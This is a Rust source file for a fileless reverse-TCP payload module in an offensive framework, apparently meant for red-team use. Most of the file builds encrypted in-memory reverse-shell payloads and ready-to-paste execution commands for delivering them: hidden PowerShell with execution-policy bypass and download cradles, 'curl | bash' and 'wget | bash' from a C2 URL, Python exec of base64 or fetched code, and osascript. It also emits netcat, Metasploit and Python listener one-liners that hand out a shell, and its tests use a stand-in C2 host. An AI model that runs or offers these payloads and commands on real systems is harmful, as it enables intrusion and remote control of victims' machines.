//! Fileless Reverse TCP Payload Module
//!
//! Generates encrypted, memory-only reverse TCP payloads that connect back
//! to a listener without writing to disk. Integrates with the Smart Payload
//! Engine for encryption and C2 channel delivery.
//!
//! **SECURITY NOTICE**: This module is designed for AUTHORIZED penetration
//! testing, red team exercises, and security research ONLY.
//!
//! Features:
//! - Fileless execution (memory-only)
//! - AES-256-GCM encryption
//! - Base64 output for C2 delivery
//! - Multi-stage support (Stage-1 + Stage-2)
//! - Cross-platform (Windows/Linux/macOS)
//! - OS auto-detection or manual selection
//!
//! Options:
//! - LHOST: Listener host address (required)
//! - LPORT: Listener port (default: 4444)
//! - TARGET_OS: Target OS (windows/linux/macos/any)
//! - ENCRYPTION_KEY: Custom encryption passphrase
//! - STAGED: Enable multi-stage delivery (true/false)
//! - C2_URL: C2 URL for staged payload delivery
//! - OUTPUT_FORMAT: Output format (base64/hex/raw)

use anyhow::{bail, Result};
use async_trait::async_trait;
use base64::Engine;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

use crate::core::module::{
    CheckResult, Module, ModuleInfo, ModuleOption, ModuleResult, ModuleType,
};
use crate::core::payload::Architecture;
use crate::core::payload_engine::{C2Channel, PayloadEngine, StagerConfig, TargetOS};

/// Fileless Reverse TCP Payload Module
pub struct FilelessRevTcp {
    options: HashMap<String, String>,
    engine: Option<PayloadEngine>,
}

impl FilelessRevTcp {
    pub fn new() -> Self {
        let mut options = HashMap::new();
        options.insert("LHOST".to_string(), String::new());
        options.insert("LPORT".to_string(), "4444".to_string());
        options.insert("TARGET_OS".to_string(), "any".to_string());
        options.insert("ARCHITECTURE".to_string(), "any".to_string());
        options.insert("ENCRYPTION_KEY".to_string(), String::new());
        options.insert("STAGED".to_string(), "false".to_string());
        options.insert("C2_URL".to_string(), String::new());
        options.insert("C2_CHANNEL".to_string(), "http".to_string());
        options.insert("OUTPUT_FORMAT".to_string(), "base64".to_string());
        options.insert("SAFE_MODE".to_string(), "true".to_string());

        Self {
            options,
            engine: None,
        }
    }

    fn get_option_or(&self, name: &str, default: &str) -> String {
        self.options
            .get(name)
            .filter(|v| !v.is_empty())
            .cloned()
            .unwrap_or_else(|| default.to_string())
    }

    fn is_staged(&self) -> bool {
        self.get_option_or("STAGED", "false")
            .to_lowercase()
            .parse()
            .unwrap_or(false)
    }

    fn is_safe_mode(&self) -> bool {
        self.get_option_or("SAFE_MODE", "true")
            .to_lowercase()
            .parse()
            .unwrap_or(true)
    }

    fn parse_target_os(&self) -> Result<TargetOS> {
        self.get_option_or("TARGET_OS", "any").parse()
    }

    fn parse_architecture(&self) -> Architecture {
        match self.get_option_or("ARCHITECTURE", "any").to_lowercase().as_str() {
            "x64" | "amd64" | "x86_64" => Architecture::X64,
            "x86" | "i386" | "i686" => Architecture::X86,
            "arm64" | "aarch64" => Architecture::ARM64,
            "arm" | "armv7" => Architecture::ARM,
            _ => Architecture::Any,
        }
    }

    fn parse_c2_channel(&self) -> C2Channel {
        match self.get_option_or("C2_CHANNEL", "http").to_lowercase().as_str() {
            "teams" => C2Channel::Teams,
            "github" | "gist" => C2Channel::GitHubGist,
            "dns" | "doh" => C2Channel::DnsOverHttps,
            "tcp" | "direct" => C2Channel::DirectTcp,
            _ => C2Channel::HttpBeacon,
        }
    }

    fn initialize_engine(&mut self) -> Result<()> {
        let key = self.get_option_or("ENCRYPTION_KEY", "ferox-payload-default");
        let mut engine = PayloadEngine::from_passphrase(&key)?;

        // Configure engine
        engine.set_target_os(self.parse_target_os()?);
        engine.set_architecture(self.parse_architecture());

        // Enable production mode if safe_mode is disabled
        if !self.is_safe_mode() {
            engine.enable_production_mode();
        }

        self.engine = Some(engine);
        Ok(())
    }

    /// Generate ready-to-paste execution commands for each target OS
    ///
    /// Returns a vector of execution commands that can be used to run the payload
    /// on the target system. Commands are OS-specific and include multiple options.
    pub fn generate_execution_commands(
        &self,
        payload_base64: &str,
        target_os: &TargetOS,
        c2_url: Option<&str>,
    ) -> Vec<ExecutionCommand> {
        let mut commands = Vec::new();

        match target_os {
            TargetOS::Windows => {
                // PowerShell Direct Execution (most common)
                commands.push(ExecutionCommand {
                    name: "PowerShell Base64 Decode & Execute".to_string(),
                    description: "Decodes and executes the payload directly in PowerShell".to_string(),
                    command: format!(
                        "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{}')) | iex\"",
                        payload_base64
                    ),
                    requires_admin: false,
                });

                // PowerShell encoded command
                let encoded = base64::engine::general_purpose::STANDARD
                    .encode(payload_base64.encode_utf16().flat_map(|c| c.to_le_bytes()).collect::<Vec<u8>>());
                commands.push(ExecutionCommand {
                    name: "PowerShell Encoded Command".to_string(),
                    description: "Uses -EncodedCommand flag for execution".to_string(),
                    command: format!("powershell -NoP -W Hidden -Enc {}", encoded),
                    requires_admin: false,
                });

                // CMD via PowerShell
                commands.push(ExecutionCommand {
                    name: "CMD via PowerShell".to_string(),
                    description: "Executes through cmd.exe calling PowerShell".to_string(),
                    command: format!(
                        "cmd /c powershell -NoP -W Hidden -Command \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{}')) | iex\"",
                        payload_base64
                    ),
                    requires_admin: false,
                });

                // C2 URL stager if provided
                if let Some(url) = c2_url {
                    commands.push(ExecutionCommand {
                        name: "PowerShell Download Cradle".to_string(),
                        description: "Downloads and executes Stage-2 from C2 URL".to_string(),
                        command: format!(
                            "powershell -NoP -W Hidden -Command \"IEX(New-Object Net.WebClient).DownloadString('{}')\"",
                            url
                        ),
                        requires_admin: false,
                    });
                }
            }
            TargetOS::Linux => {
                // Bash base64 decode
                commands.push(ExecutionCommand {
                    name: "Bash Base64 Decode & Execute".to_string(),
                    description: "Decodes and executes via bash".to_string(),
                    command: format!("echo '{}' | base64 -d | bash", payload_base64),
                    requires_admin: false,
                });

                // Python execution
                commands.push(ExecutionCommand {
                    name: "Python Base64 Execute".to_string(),
                    description: "Uses Python to decode and execute".to_string(),
                    command: format!(
                        "python3 -c \"import base64;exec(base64.b64decode('{}'))\"",
                        payload_base64
                    ),
                    requires_admin: false,
                });

                // C2 URL stager if provided
                if let Some(url) = c2_url {
                    commands.push(ExecutionCommand {
                        name: "Curl Download & Execute".to_string(),
                        description: "Downloads and executes from C2 URL".to_string(),
                        command: format!("curl -s {} | bash", url),
                        requires_admin: false,
                    });

                    commands.push(ExecutionCommand {
                        name: "Wget Download & Execute".to_string(),
                        description: "Alternative using wget".to_string(),
                        command: format!("wget -qO- {} | bash", url),
                        requires_admin: false,
                    });
                }
            }
            TargetOS::MacOS => {
                // macOS uses -D for base64 decode
                commands.push(ExecutionCommand {
                    name: "Bash Base64 Decode & Execute (macOS)".to_string(),
                    description: "Decodes and executes via bash (macOS base64 -D flag)".to_string(),
                    command: format!("echo '{}' | base64 -D | bash", payload_base64),
                    requires_admin: false,
                });

                // Python execution (available on macOS)
                commands.push(ExecutionCommand {
                    name: "Python Base64 Execute".to_string(),
                    description: "Uses Python to decode and execute".to_string(),
                    command: format!(
                        "python3 -c \"import base64;exec(base64.b64decode('{}'))\"",
                        payload_base64
                    ),
                    requires_admin: false,
                });

                // osascript for AppleScript execution
                commands.push(ExecutionCommand {
                    name: "osascript Shell Execution".to_string(),
                    description: "Executes via AppleScript shell command".to_string(),
                    command: format!(
                        "osascript -e 'do shell script \"echo {} | base64 -D | bash\"'",
                        payload_base64
                    ),
                    requires_admin: false,
                });

                // C2 URL stager if provided
                if let Some(url) = c2_url {
                    commands.push(ExecutionCommand {
                        name: "Curl Download & Execute".to_string(),
                        description: "Downloads and executes from C2 URL".to_string(),
                        command: format!("curl -s {} | bash", url),
                        requires_admin: false,
                    });
                }
            }
            TargetOS::Any => {
                // Cross-platform Python
                commands.push(ExecutionCommand {
                    name: "Python Universal".to_string(),
                    description: "Cross-platform Python execution".to_string(),
                    command: format!(
                        "python3 -c \"import base64;exec(base64.b64decode('{}'))\"",
                        payload_base64
                    ),
                    requires_admin: false,
                });

                // Python with fallback to python2
                commands.push(ExecutionCommand {
                    name: "Python with Fallback".to_string(),
                    description: "Tries python3, falls back to python".to_string(),
                    command: format!(
                        "python3 -c \"import base64;exec(base64.b64decode('{}'))\" 2>/dev/null || python -c \"import base64;exec(base64.b64decode('{}'))\"",
                        payload_base64, payload_base64
                    ),
                    requires_admin: false,
                });

                // C2 URL stager if provided
                if let Some(url) = c2_url {
                    commands.push(ExecutionCommand {
                        name: "Python URL Fetch & Execute".to_string(),
                        description: "Downloads and executes via Python urllib".to_string(),
                        command: format!(
                            "python3 -c \"import urllib.request;exec(urllib.request.urlopen('{}').read())\"",
                            url
                        ),
                        requires_admin: false,
                    });
                }
            }
        }

        commands
    }

    /// Generate listener command suggestions for receiving the reverse connection
    ///
    /// Returns commands for starting a listener on the attacker's machine
    pub fn generate_listener_commands(&self, lhost: &str, lport: u16) -> Vec<ExecutionCommand> {
        vec![
            ExecutionCommand {
                name: "Netcat Listener".to_string(),
                description: "Simple netcat listener for reverse shell".to_string(),
                command: format!("nc -lvnp {}", lport),
                requires_admin: lport < 1024,
            },
            ExecutionCommand {
                name: "Netcat Listener (GNU)".to_string(),
                description: "GNU netcat with -e support".to_string(),
                command: format!("nc -nlvp {}", lport),
                requires_admin: lport < 1024,
            },
            ExecutionCommand {
                name: "Ncat Listener (Nmap)".to_string(),
                description: "Ncat from Nmap suite with SSL support".to_string(),
                command: format!("ncat -lvnp {}", lport),
                requires_admin: lport < 1024,
            },
            ExecutionCommand {
                name: "Socat Listener".to_string(),
                description: "Socat TCP listener".to_string(),
                command: format!("socat TCP-LISTEN:{},reuseaddr,fork STDOUT", lport),
                requires_admin: lport < 1024,
            },
            ExecutionCommand {
                name: "Metasploit Handler".to_string(),
                description: "Metasploit multi/handler for reverse shell".to_string(),
                command: format!(
                    "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST {}; set LPORT {}; exploit'",
                    lhost, lport
                ),
                requires_admin: false,
            },
            ExecutionCommand {
                name: "Python Listener".to_string(),
                description: "Simple Python socket listener".to_string(),
                command: format!(
                    "python3 -c \"import socket;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('0.0.0.0',{}));s.listen(1);c,a=s.accept();print(f'Connection from {{a}}');import subprocess;subprocess.call(['/bin/sh','-i'],stdin=c,stdout=c,stderr=c)\"",
                    lport
                ),
                requires_admin: lport < 1024,
            },
        ]
    }
}

/// Execution command structure for ready-to-paste commands
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExecutionCommand {
    /// Name/identifier for the command
    pub name: String,
    /// Description of what the command does
    pub description: String,
    /// The actual command to execute
    pub command: String,
    /// Whether the command requires admin/root privileges
    pub requires_admin: bool,
}

impl Default for FilelessRevTcp {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl Module for FilelessRevTcp {
    fn info(&self) -> ModuleInfo {
        ModuleInfo {
            name: "rev_tcp_fileless".to_string(),
            version: "1.0.0".to_string(),
            author: "Ferox Team".to_string(),
            description: "Fileless reverse TCP payload with AES-256-GCM encryption. \
                         Executes entirely in memory without disk writes. \
                         Supports multi-stage delivery via C2 channels."
                .to_string(),
            module_type: ModuleType::Payload,
            category: "payloads".to_string(),
        }
    }

    fn options(&self) -> Vec<ModuleOption> {
        vec![
            ModuleOption {
                name: "LHOST".to_string(),
                description: "Listener host address for reverse connection".to_string(),
                required: true,
                default_value: None,
                current_value: self.options.get("LHOST").cloned(),
            },
            ModuleOption {
                name: "LPORT".to_string(),
                description: "Listener port number".to_string(),
                required: false,
                default_value: Some("4444".to_string()),
                current_value: self.options.get("LPORT").cloned(),
            },
            ModuleOption {
                name: "TARGET_OS".to_string(),
                description: "Target OS: windows, linux, macos, any".to_string(),
                required: false,
                default_value: Some("any".to_string()),
                current_value: self.options.get("TARGET_OS").cloned(),
            },
            ModuleOption {
                name: "ARCHITECTURE".to_string(),
                description: "Target architecture: x64, x86, arm64, arm, any".to_string(),
                required: false,
                default_value: Some("any".to_string()),
                current_value: self.options.get("ARCHITECTURE").cloned(),
            },
            ModuleOption {
                name: "ENCRYPTION_KEY".to_string(),
                description: "Custom encryption passphrase (default: auto-generated)".to_string(),
                required: false,
                default_value: None,
                current_value: self.options.get("ENCRYPTION_KEY").cloned(),
            },
            ModuleOption {
                name: "STAGED".to_string(),
                description: "Enable multi-stage delivery: true/false".to_string(),
                required: false,
                default_value: Some("false".to_string()),
                current_value: self.options.get("STAGED").cloned(),
            },
            ModuleOption {
                name: "C2_URL".to_string(),
                description: "C2 URL for staged payload delivery".to_string(),
                required: false,
                default_value: None,
                current_value: self.options.get("C2_URL").cloned(),
            },
            ModuleOption {
                name: "C2_CHANNEL".to_string(),
                description: "C2 channel: http, teams, github, dns".to_string(),
                required: false,
                default_value: Some("http".to_string()),
                current_value: self.options.get("C2_CHANNEL").cloned(),
            },
            ModuleOption {
                name: "OUTPUT_FORMAT".to_string(),
                description: "Output format: base64, hex, raw".to_string(),
                required: false,
                default_value: Some("base64".to_string()),
                current_value: self.options.get("OUTPUT_FORMAT").cloned(),
            },
            ModuleOption {
                name: "SAFE_MODE".to_string(),
                description: "Safe mode generates reference payloads only: true/false".to_string(),
                required: false,
                default_value: Some("true".to_string()),
                current_value: self.options.get("SAFE_MODE").cloned(),
            },
        ]
    }

    fn set_option(&mut self, name: &str, value: &str) -> Result<()> {
        let name_upper = name.to_uppercase();
        if !self.options.contains_key(&name_upper) {
            bail!("Unknown option: {}", name);
        }
        self.options.insert(name_upper, value.to_string());
        Ok(())
    }

    fn get_option(&self, name: &str) -> Option<String> {
        self.options.get(&name.to_uppercase()).cloned()
    }

    fn validate(&self) -> Result<()> {
        // LHOST is required
        let lhost = self.options.get("LHOST").cloned().unwrap_or_default();
        if lhost.is_empty() {
            bail!("LHOST is required");
        }

        // Validate LPORT
        let lport = self.get_option_or("LPORT", "4444");
        let port: u16 = lport.parse().map_err(|_| anyhow::anyhow!("Invalid LPORT: {}", lport))?;
        if port == 0 {
            bail!("LPORT cannot be 0");
        }

        // If staged, C2_URL is required
        if self.is_staged() {
            let c2_url = self.options.get("C2_URL").cloned().unwrap_or_default();
            if c2_url.is_empty() {
                bail!("C2_URL is required when STAGED=true");
            }
        }

        // Validate TARGET_OS
        self.parse_target_os()?;

        Ok(())
    }

    async fn check(&self) -> Result<CheckResult> {
        // Payload modules don't have a traditional "check" - return info about configuration
        let target_os = self.parse_target_os().unwrap_or(TargetOS::Any);
        let arch = self.parse_architecture();

        let mut fingerprint = HashMap::new();
        fingerprint.insert("target_os".to_string(), target_os.to_string());
        fingerprint.insert("architecture".to_string(), format!("{:?}", arch));
        fingerprint.insert("staged".to_string(), self.is_staged().to_string());
        fingerprint.insert("safe_mode".to_string(), self.is_safe_mode().to_string());

        Ok(CheckResult {
            vulnerable: true, // Payload is "ready" to generate
            confidence: 1.0,
            details: format!(
                "Payload configured for {} ({:?}), staged={}, safe_mode={}",
                target_os,
                arch,
                self.is_staged(),
                self.is_safe_mode()
            ),
            fingerprint,
        })
    }

    async fn run(&mut self) -> Result<ModuleResult> {
        // Initialize the payload engine
        self.initialize_engine()?;

        let engine = self
            .engine
            .as_ref()
            .ok_or_else(|| anyhow::anyhow!("PayloadEngine not initialized"))?;

        let lhost = self.options.get("LHOST").cloned().unwrap_or_default();
        let lport: u16 = self.get_option_or("LPORT", "4444").parse()?;
        let output_format = self.get_option_or("OUTPUT_FORMAT", "base64").to_lowercase();

        let result = if self.is_staged() {
            // Generate staged payload (Stage-1 stager)
            let c2_url = self.options.get("C2_URL").cloned().unwrap_or_default();
            let config = StagerConfig {
                c2_url: c2_url.clone(),
                c2_channel: self.parse_c2_channel(),
                stage2_key: self.options.get("ENCRYPTION_KEY").cloned(),
                ..Default::default()
            };

            let stager = engine.generate_stager(&config)?;

            // Also generate Stage-2 for reference
            let stage2_key = stager
                .stage
                .next_stage_key
                .clone()
                .unwrap_or_else(|| "default-stage2-key".to_string());
            let stage2 = engine.generate_stage2(&lhost, lport, &stage2_key)?;

            // Return both stages info
            let mut data = HashMap::new();
            data.insert(
                "stage1_payload".to_string(),
                serde_json::json!(match output_format.as_str() {
                    "hex" => stager.hex.clone(),
                    "raw" => base64::engine::general_purpose::STANDARD.encode(&stager.data),
                    _ => stager.base64.clone(),
                }),
            );
            data.insert(
                "stage1_size".to_string(),
                serde_json::json!(stager.metadata.size),
            );
            data.insert(
                "stage1_checksum".to_string(),
                serde_json::json!(stager.metadata.checksum_sha256),
            );
            data.insert(
                "stage2_key".to_string(),
                serde_json::json!(stage2_key),
            );
            data.insert(
                "stage2_payload".to_string(),
                serde_json::json!(match output_format.as_str() {
                    "hex" => stage2.hex.clone(),
                    "raw" => base64::engine::general_purpose::STANDARD.encode(&stage2.data),
                    _ => stage2.base64.clone(),
                }),
            );
            data.insert(
                "stage2_size".to_string(),
                serde_json::json!(stage2.metadata.size),
            );
            data.insert(
                "c2_url".to_string(),
                serde_json::json!(c2_url),
            );
            data.insert(
                "c2_channel".to_string(),
                serde_json::json!(format!("{:?}", self.parse_c2_channel())),
            );
            data.insert(
                "encrypted".to_string(),
                serde_json::json!(true),
            );
            data.insert(
                "safe_mode".to_string(),
                serde_json::json!(self.is_safe_mode()),
            );

            // Generate execution commands for staged payload
            let target_os = self.parse_target_os()?;
            let stage1_exec_commands = self.generate_execution_commands(&stager.base64, &target_os, Some(&c2_url));
            let listener_commands = self.generate_listener_commands(&lhost, lport);

            data.insert(
                "stage1_execution_commands".to_string(),
                serde_json::json!(stage1_exec_commands),
            );
            data.insert(
                "listener_commands".to_string(),
                serde_json::json!(listener_commands),
            );

            ModuleResult {
                success: true,
                message: format!(
                    "Staged payload generated: Stage-1 ({} bytes) + Stage-2 ({} bytes), {} execution commands available",
                    stager.metadata.size, stage2.metadata.size, stage1_exec_commands.len()
                ),
                data,
                timestamp: chrono::Utc::now(),
                session_id: None,
            }
        } else {
            // Generate single-stage payload
            let payload = engine.generate_reverse_tcp(&lhost, lport)?;

            // Generate execution commands for target OS
            let target_os = self.parse_target_os()?;
            let c2_url = self.options.get("C2_URL").filter(|s| !s.is_empty()).map(|s| s.as_str());
            let execution_commands = self.generate_execution_commands(&payload.base64, &target_os, c2_url);
            let listener_commands = self.generate_listener_commands(&lhost, lport);

            let mut data = HashMap::new();
            data.insert(
                "payload".to_string(),
                serde_json::json!(match output_format.as_str() {
                    "hex" => payload.hex.clone(),
                    "raw" => base64::engine::general_purpose::STANDARD.encode(&payload.data),
                    _ => payload.base64.clone(),
                }),
            );
            data.insert("size".to_string(), serde_json::json!(payload.metadata.size));
            data.insert(
                "checksum".to_string(),
                serde_json::json!(payload.metadata.checksum_sha256),
            );
            data.insert(
                "target_os".to_string(),
                serde_json::json!(payload.metadata.target_os.to_string()),
            );
            data.insert(
                "architecture".to_string(),
                serde_json::json!(format!("{:?}", payload.metadata.architecture)),
            );
            data.insert(
                "encrypted".to_string(),
                serde_json::json!(payload.metadata.encrypted),
            );
            data.insert(
                "format".to_string(),
                serde_json::json!(output_format),
            );
            data.insert(
                "safe_mode".to_string(),
                serde_json::json!(self.is_safe_mode()),
            );
            data.insert(
                "lhost".to_string(),
                serde_json::json!(lhost),
            );
            data.insert(
                "lport".to_string(),
                serde_json::json!(lport),
            );

            // Add execution commands to result
            data.insert(
                "execution_commands".to_string(),
                serde_json::json!(execution_commands),
            );
            data.insert(
                "listener_commands".to_string(),
                serde_json::json!(listener_commands),
            );

            ModuleResult {
                success: true,
                message: format!(
                    "Fileless reverse TCP payload generated: {} bytes, encrypted={}, target={}:{}, os={}, safe_mode={}, {} execution commands available",
                    payload.metadata.size,
                    payload.metadata.encrypted,
                    lhost,
                    lport,
                    payload.metadata.target_os,
                    self.is_safe_mode(),
                    execution_commands.len()
                ),
                data,
                timestamp: chrono::Utc::now(),
                session_id: None,
            }
        };

        Ok(result)
    }

    async fn cleanup(&mut self) -> Result<()> {
        // Clear the engine and any sensitive data
        self.engine = None;
        Ok(())
    }

    fn requires_confirmation(&self) -> bool {
        // Require confirmation if not in safe mode
        !self.is_safe_mode()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_module_creation() {
        let module = FilelessRevTcp::new();
        let info = module.info();

        assert_eq!(info.name, "rev_tcp_fileless");
        assert_eq!(info.module_type, ModuleType::Payload);
        assert_eq!(info.category, "payloads");
    }

    #[test]
    fn test_options() {
        let module = FilelessRevTcp::new();
        let options = module.options();

        assert!(options.iter().any(|o| o.name == "LHOST"));
        assert!(options.iter().any(|o| o.name == "LPORT"));
        assert!(options.iter().any(|o| o.name == "TARGET_OS"));
        assert!(options.iter().any(|o| o.name == "STAGED"));
    }

    #[test]
    fn test_set_option() {
        let mut module = FilelessRevTcp::new();

        module.set_option("LHOST", "192.168.1.100").unwrap();
        assert_eq!(module.get_option("LHOST"), Some("192.168.1.100".to_string()));

        module.set_option("lport", "8080").unwrap();
        assert_eq!(module.get_option("LPORT"), Some("8080".to_string()));
    }

    #[test]
    fn test_validation() {
        let mut module = FilelessRevTcp::new();

        // Should fail without LHOST
        assert!(module.validate().is_err());

        // Should pass with LHOST
        module.set_option("LHOST", "192.168.1.100").unwrap();
        assert!(module.validate().is_ok());
    }

    #[test]
    fn test_staged_validation() {
        let mut module = FilelessRevTcp::new();
        module.set_option("LHOST", "192.168.1.100").unwrap();
        module.set_option("STAGED", "true").unwrap();

        // Should fail without C2_URL when staged
        assert!(module.validate().is_err());

        // Should pass with C2_URL
        module.set_option("C2_URL", "https://c2.example.com/stage2").unwrap();
        assert!(module.validate().is_ok());
    }

    #[tokio::test]
    async fn test_run_single_stage() {
        let mut module = FilelessRevTcp::new();
        module.set_option("LHOST", "192.168.1.100").unwrap();
        module.set_option("LPORT", "4444").unwrap();

        let result = module.run().await.unwrap();

        assert!(result.success);
        assert!(result.data.contains_key("payload"));
        assert!(result.data.contains_key("size"));
        assert!(result.data.contains_key("checksum"));
    }

    #[tokio::test]
    async fn test_run_staged() {
        let mut module = FilelessRevTcp::new();
        module.set_option("LHOST", "192.168.1.100").unwrap();
        module.set_option("STAGED", "true").unwrap();
        module.set_option("C2_URL", "https://c2.example.com/stage2").unwrap();

        let result = module.run().await.unwrap();

        assert!(result.success);
        assert!(result.data.contains_key("stage1_payload"));
        assert!(result.data.contains_key("stage2_payload"));
        assert!(result.data.contains_key("stage2_key"));
    }

    #[tokio::test]
    async fn test_check() {
        let mut module = FilelessRevTcp::new();
        module.set_option("LHOST", "192.168.1.100").unwrap();
        module.set_option("TARGET_OS", "linux").unwrap();

        let check = module.check().await.unwrap();

        assert!(check.vulnerable);
        assert_eq!(check.fingerprint.get("target_os"), Some(&"linux".to_string()));
    }

    #[test]
    fn test_safe_mode_default() {
        let module = FilelessRevTcp::new();
        assert!(module.is_safe_mode());
    }

    #[test]
    fn test_requires_confirmation() {
        let mut module = FilelessRevTcp::new();

        // Safe mode doesn't require confirmation
        assert!(!module.requires_confirmation());

        // Production mode requires confirmation
        module.set_option("SAFE_MODE", "false").unwrap();
        assert!(module.requires_confirmation());
    }

    #[test]
    fn test_execution_commands_windows() {
        let module = FilelessRevTcp::new();
        let payload_base64 = "dGVzdCBwYXlsb2Fk"; // "test payload" in base64

        let commands = module.generate_execution_commands(
            payload_base64,
            &TargetOS::Windows,
            None,
        );

        assert!(!commands.is_empty());
        assert!(commands.iter().any(|c| c.name.contains("PowerShell")));
        assert!(commands.iter().all(|c| !c.command.is_empty()));
    }

    #[test]
    fn test_execution_commands_linux() {
        let module = FilelessRevTcp::new();
        let payload_base64 = "dGVzdCBwYXlsb2Fk";

        let commands = module.generate_execution_commands(
            payload_base64,
            &TargetOS::Linux,
            None,
        );

        assert!(!commands.is_empty());
        assert!(commands.iter().any(|c| c.name.contains("Bash")));
        assert!(commands.iter().any(|c| c.name.contains("Python")));
    }

    #[test]
    fn test_execution_commands_macos() {
        let module = FilelessRevTcp::new();
        let payload_base64 = "dGVzdCBwYXlsb2Fk";

        let commands = module.generate_execution_commands(
            payload_base64,
            &TargetOS::MacOS,
            None,
        );

        assert!(!commands.is_empty());
        // macOS uses -D flag for base64
        assert!(commands.iter().any(|c| c.command.contains("base64 -D")));
        assert!(commands.iter().any(|c| c.name.contains("osascript")));
    }

    #[test]
    fn test_execution_commands_with_c2_url() {
        let module = FilelessRevTcp::new();
        let payload_base64 = "dGVzdCBwYXlsb2Fk";
        let c2_url = "https://c2.example.com/stage2";

        let commands = module.generate_execution_commands(
            payload_base64,
            &TargetOS::Linux,
            Some(c2_url),
        );

        assert!(!commands.is_empty());
        // Should include C2 download commands
        assert!(commands.iter().any(|c| c.command.contains(c2_url)));
        assert!(commands.iter().any(|c| c.name.contains("Curl") || c.name.contains("Download")));
    }

    #[test]
    fn test_listener_commands() {
        let module = FilelessRevTcp::new();
        let commands = module.generate_listener_commands("192.168.1.100", 4444);

        assert!(!commands.is_empty());
        assert!(commands.iter().any(|c| c.name.contains("Netcat")));
        assert!(commands.iter().any(|c| c.name.contains("Metasploit")));
        assert!(commands.iter().any(|c| c.name.contains("Socat")));

        // Check port is included in commands
        assert!(commands.iter().all(|c| c.command.contains("4444")));
    }

    #[test]
    fn test_listener_commands_privileged_port() {
        let module = FilelessRevTcp::new();
        let commands = module.generate_listener_commands("192.168.1.100", 443);

        // Privileged ports (< 1024) should require admin
        let nc_command = commands.iter().find(|c| c.name == "Netcat Listener").unwrap();
        assert!(nc_command.requires_admin);
    }

    #[test]
    fn test_listener_commands_unprivileged_port() {
        let module = FilelessRevTcp::new();
        let commands = module.generate_listener_commands("192.168.1.100", 4444);

        // Unprivileged ports should not require admin
        let nc_command = commands.iter().find(|c| c.name == "Netcat Listener").unwrap();
        assert!(!nc_command.requires_admin);
    }

    #[tokio::test]
    async fn test_run_includes_execution_commands() {
        let mut module = FilelessRevTcp::new();
        module.set_option("LHOST", "192.168.1.100").unwrap();
        module.set_option("LPORT", "4444").unwrap();
        module.set_option("TARGET_OS", "linux").unwrap();

        let result = module.run().await.unwrap();

        assert!(result.success);
        assert!(result.data.contains_key("execution_commands"));
        assert!(result.data.contains_key("listener_commands"));

        // Verify execution_commands is an array
        let exec_cmds = result.data.get("execution_commands").unwrap();
        assert!(exec_cmds.is_array());
        assert!(!exec_cmds.as_array().unwrap().is_empty());
    }

    #[tokio::test]
    async fn test_staged_run_includes_execution_commands() {
        let mut module = FilelessRevTcp::new();
        module.set_option("LHOST", "192.168.1.100").unwrap();
        module.set_option("STAGED", "true").unwrap();
        module.set_option("C2_URL", "https://c2.example.com/stage2").unwrap();

        let result = module.run().await.unwrap();

        assert!(result.success);
        assert!(result.data.contains_key("stage1_execution_commands"));
        assert!(result.data.contains_key("listener_commands"));
    }
}
